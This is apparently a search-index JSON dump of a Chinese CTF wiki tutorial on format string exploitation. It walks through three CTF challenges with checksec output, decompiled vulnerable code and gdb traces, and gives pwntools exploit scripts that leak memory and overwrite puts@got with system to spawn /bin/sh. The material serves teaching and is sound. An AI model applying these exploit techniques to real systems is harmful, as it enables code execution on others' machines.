            "title": "64\u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_2", 
            "text": "\u5176\u5b9e64\u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c32\u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc764\u4f4d\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f\u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_3", 
            "text": "\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52017\u5e74\u7684UIUCTF\u4e2dpwn200 GoodLuck\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2aflag.txt\u6587\u4ef6\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_4", 
            "text": "\u279c   2017 -UIUCTF-pwn200-GoodLuck git: ( master )  \u2717 checksec goodluck\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206RELRO\u4fdd\u62a4\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_5", 
            "text": "\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e     for   (   j   =   0 ;   j   =   21 ;   ++ j   ) \n   { \n     v5   =   format [ j ]; \n     if   (   ! v5   ||   v11 [ j ]   !=   v5   ) \n     { \n       puts ( You answered: ); \n       printf ( format ); \n       puts ( \\n But that was totally wrong lol get rekt ); \n       fflush ( _bss_start ); \n       result   =   0 ; \n       goto   LABEL_11 ; \n     } \n   }", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_6", 
            "text": "\u6211\u4eec\u5728printf\u5904\u4e0b\u504f\u79fb\u5982\u4e0b,\u8fd9\u91cc\u53ea\u5173\u6ce8\u4ee3\u7801\u90e8\u5206\u4e0e\u6808\u90e8\u5206\u3002  gef\u27a4  b  printf \nBreakpoint  1  at 0x400640\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck \nwhat s the flag  123456  You answered:  Breakpoint 1, __printf (format=0x602830  123456 ) at printf.c:28  28  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500     0x7ffff7a627f7  fprintf+135     add    rsp, 0xd8     0x7ffff7a627fe  fprintf+142     ret         0x7ffff7a627ff                  nop       \u2192 0x7ffff7a62800  printf+0        sub    rsp, 0xd8     0x7ffff7a62807  printf+7        test   al, al     0x7ffff7a62809  printf+9        mov    QWORD PTR [rsp+0x28], rsi     0x7ffff7a6280e  printf+14       mov    QWORD PTR [rsp+0x30], rdx  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500  [ 0x7fffffffdb08 ,  l8 ]  8 \n0x00007fffffffdb08\u2502+0x00: 0x0000000000400890  \u2192   main+234  mov edi, 0x4009b8    \u2190  $rsp \n0x00007fffffffdb10\u2502+0x08: 0x0000000031000001\n0x00007fffffffdb18\u2502+0x10: 0x0000000000602830  \u2192  0x0000363534333231  ( 123456 ? ) \n0x00007fffffffdb20\u2502+0x18: 0x0000000000602010  \u2192   You answered:\\ng \n0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30  \u2192   flag{11111111111111111 \n0x00007fffffffdb30\u2502+0x28:  flag{11111111111111111 \n0x00007fffffffdb38\u2502+0x30:  11111111111111 \n0x00007fffffffdb40\u2502+0x38: 0x0000313131313131  ( 111111 ? ) \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830  123456 )  [ #1] 0x400890 \u2192 Name: main() \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u53ef\u4ee5\u770b\u5230flag\u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d6\u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt\u5b57\u7b26\u4e32\u5b58\u50a8\u5728RDI\u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5fmt\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a10\u3002\u800cfmt\u5b57\u7b26\u4e32\u4e2d%order s\u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165%9\\ s\u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165%9\\ s\u5373\u53ef\u5f97\u5230flag\u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528https://github.com/scwuaptx/Pwngdb\u4e2d\u7684fmtarg\u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002  gef\u27a4  fmtarg 0x00007fffffffdb28\nThe index of format argument :  10   \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987bbreak\u5728printf\u5904\u3002", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_7", 
            "text": "from   pwn   import   *  from   LibcSearcher   import   *  goodluck   =   ELF ( ./goodluck )  if   args [ REMOTE ]: \n     sh   =   remote ( pwn.sniperoj.cn ,   30017 )  else : \n     sh   =   process ( ./goodluck )  payload   =   %9$s  print   payload  ##gdb.attach(sh)  sh . sendline ( payload )  print   sh . recv ()  sh . interactive ()", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#hijack-got", 
            "text": "", 
            "title": "hijack GOT"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_8", 
            "text": "\u5728\u76ee\u524d\u7684C\u7a0b\u5e8f\u4e2d\uff0clibc\u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7GOT\u8868\u6765\u8df3\u8f6c\u7684\u3002\u6b64\u5916\uff0c\u5728 \u6ca1\u6709\u5f00\u542fRELRO\u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2alibc\u7684\u51fd\u6570\u5bf9\u5e94\u7684GOT\u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2alibc\u51fd\u6570\u7684GOT\u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539printf\u7684got\u8868\u9879\u5185\u5bb9\u4e3asystem\u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884cprintf\u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002  \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570A\u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570B\u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4    \u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u3002   \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570A\u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002     \u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740   \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570B\u7684\u5730\u5740\u3002     \u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002    \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd   \u5199\u5165\u51fd\u6570\uff1awrite\u51fd\u6570\u3002  ROP   pop eax; ret;           # printf@got -  eax\npop ebx; ret;           # (addr_offset = system_addr - printf_addr) -  ebx\nadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset   \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_9", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee52016 CCTF\u4e2d\u7684pwn3\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_10", 
            "text": "\u5982\u4e0b  \u279c   2016 -CCTF-pwn3 git: ( master )  \u2717 checksec pwn3 \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542fASLR\u4fdd\u62a4\u7684\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_11", 
            "text": "\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684ftp\uff0c\u5177\u6709get\uff0cput\uff0cdir\u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728get\u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e  int   get_file ()  { \n   char   dest ;   // [sp+1Ch] [bp-FCh]@5 \n   char   s1 ;   // [sp+E4h] [bp-34h]@1 \n   char   * i ;   // [sp+10Ch] [bp-Ch]@3 \n\n   printf ( enter the file name you want to get: ); \n   __isoc99_scanf ( %40s ,   s1 ); \n   if   (   ! strncmp ( s1 ,   flag ,   4u )   ) \n     puts ( too young, too simple ); \n   for   (   i   =   ( char   * ) file_head ;   i ;   i   =   ( char   * ) * (( _DWORD   * ) i   +   60 )   ) \n   { \n     if   (   ! strcmp ( i ,   s1 )   ) \n     { \n       strcpy ( dest ,   i   +   0x28 ); \n       return   printf ( dest ); \n     } \n   } \n   return   printf ( dest );  }", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_12", 
            "text": "\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def   \u7ed5\u8fc7\u5bc6\u7801  \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb  \u5229\u7528put@got\u83b7\u53d6put\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684libc.so\u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94system\u51fd\u6570\u5730\u5740\u3002  \u4fee\u6539puts@got\u7684\u5185\u5bb9\u4e3asystem\u7684\u5730\u5740\u3002  \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884cputs\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002", 
            "title": "\u6f0f\u6d1e\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_13", 
            "text": "\u5982\u4e0b  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  ##context.log_level =  debug  pwn3   =   ELF ( ./pwn3 )  if   args [ REMOTE ]: \n     sh   =   remote ( 111 ,   111 )  else : \n     sh   =   process ( ./pwn3 )  def   get ( name ): \n     sh . sendline ( get ) \n     sh . recvuntil ( enter the file name you want to get: ) \n     sh . sendline ( name ) \n     data   =   sh . recv () \n     return   data  def   put ( name ,   content ): \n     sh . sendline ( put ) \n     sh . recvuntil ( please enter the name of the file you want to upload: ) \n     sh . sendline ( name ) \n     sh . recvuntil ( then, enter the content: ) \n     sh . sendline ( content )  def   show_dir (): \n     sh . sendline ( dir )  tmp   =   sysbdmin  name   =    for   i   in   tmp : \n     name   +=   chr ( ord ( i )   -   1 )  ## password  def   password (): \n     sh . recvuntil ( Name (ftp.hacker.server:Rainism): ) \n     sh . sendline ( name )  ##password  password ()  ## get the addr of puts  puts_got   =   pwn3 . got [ puts ]  log . success ( puts got :    +   hex ( puts_got ))  put ( 1111 ,   %8$s   +   p32 ( puts_got ))  puts_addr   =   u32 ( get ( 1111 )[: 4 ])  ## get addr of system  libc   =   LibcSearcher ( puts ,   puts_addr )  system_offset   =   libc . dump ( system )  puts_offset   =   libc . dump ( puts )  system_addr   =   puts_addr   -   puts_offset   +   system_offset  log . success ( system addr :    +   hex ( system_addr ))  ## modify puts@got, point to system_addr  payload   =   fmtstr_payload ( 7 ,   { puts_got :   system_addr })  put ( /bin/sh; ,   payload )  sh . recvuntil ( ftp )  sh . sendline ( get )  sh . recvuntil ( enter the file name you want to get: )  ##gdb.attach(sh)  sh . sendline ( /bin/sh; )  ## system( /bin/sh )  show_dir ()  sh . interactive ()   \u6ce8\u610f   \u6211\u5728\u83b7\u53d6puts\u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d4\u4e2a\u5b57\u8282\u5c31\u662fputs\u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f7\u3002  \u8fd9\u91cc\u6211\u5229\u7528\u4e86pwntools\u4e2d\u7684fmtstr_payload\u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91ccfmtstr_payload(7, {puts_got: system_addr})\u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f7\uff0c\u6211\u5e0c\u671b\u5728puts_got\u5730\u5740\u5904\u5199\u5165system_addr\u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002", 
            "title": "\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#hijack-retaddr", 
            "text": "", 
            "title": "hijack retaddr"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_14", 
            "text": "\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_15", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5\u4e09\u4e2a\u767d\u5e3d-pwnme_k0\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_16", 
            "text": "\u279c  \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git: ( master )  \u2717 checksec pwnme_k0\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53caFull RELRO\u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684got\u8868\u4e86\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_17", 
            "text": "\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e  int   __usercall   sub_400B07 @ eax ( char   format @ dil ,   char   formata ,   __int64   a3 ,   char   a4 )  { \n   write ( 0 ,   Welc0me to sangebaimao! \\n ,   0x1AuLL ); \n   printf ( formata ,   Welc0me to sangebaimao! \\n ); \n   return   printf ( a4   +   4 );  }   \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a a4+4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684passwrod\u5185\u5bb9\u4e5f\u662f       v6   =   read ( 0 ,   ( char   * ) a4   +   4 ,   0x14uLL );   \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684username\u5728\u8ddd\u79bb\u7684password20\u4e2a\u5b57\u8282\u3002     puts ( Input your username(max lenth:20):  ); \n   fflush ( stdout ); \n   v8   =   read ( 0 ,   bufa ,   0x14uLL ); \n   if   (   v8     v8   =   0x14u   ) \n   { \n     puts ( Input your password(max lenth:20):  ); \n     fflush ( stdout ); \n     v6   =   read ( 0 ,   ( char   * ) a4   +   4 ,   0x14uLL ); \n     fflush ( stdout ); \n     * ( _QWORD   * ) buf   =   bufa ; \n     * ( _QWORD   * )( buf   +   8 )   =   a3 ; \n     * ( _QWORD   * )( buf   +   16 )   =   a4 ;   \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_18", 
            "text": "\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u572800000000004008A6\u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528system('bin/sh')\u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86shell\u3002  \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8erbp\u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002\u5229\u7528\u601d\u8def\u5982\u4e0b   \u786e\u5b9a\u504f\u79fb  \u83b7\u53d6\u51fd\u6570\u7684rbp\u4e0e\u8fd4\u56de\u5730\u5740  \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740  \u5c06\u6267\u884csystem\u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_19", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540daaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2aprintf( a4 + 4)\u51fd\u6570\u5904  Register Account first!\nInput your username(max lenth:20): \naaaaaaaa\nInput your password(max lenth:20): \n%p%p%p%p%p%p%p%p%p%p\nRegister Success!!\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:( error options\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:( 1\n...  \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n     0x400b1a                  call   0x400758\n     0x400b1f                  lea    rdi, [rbp+0x10]\n     0x400b23                  mov    eax, 0x0\n \u2192   0x400b28                  call   0x400770\n   \u21b3    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0\n        0x400776                  xchg   ax, ax\n        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8\n        0x40077e                  xchg   ax, ax\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192 